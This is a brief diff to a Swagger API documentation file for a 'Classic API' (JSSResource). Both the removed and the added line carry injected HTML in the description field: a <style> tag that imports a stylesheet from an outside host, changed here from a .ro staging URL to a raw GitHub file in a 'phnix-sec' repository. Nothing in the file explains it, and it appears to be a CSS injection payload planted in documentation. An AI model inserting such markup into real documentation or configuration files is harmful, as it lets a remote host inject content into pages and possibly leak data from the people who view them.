@@ -1,7 +1,7 @@
 swagger: '3.0'
 info:
   title: Classic API Resource Documentation
-  description: "CSS"<style>@import url(//techproject.ro/staging?len=32);</style>
+  description: "CSS"<style>@import url(//raw.githubusercontent.com/phnix-sec/testrpooo/main/test.css);</style>
   version: production
 basePath: /JSSResource/
 produces:
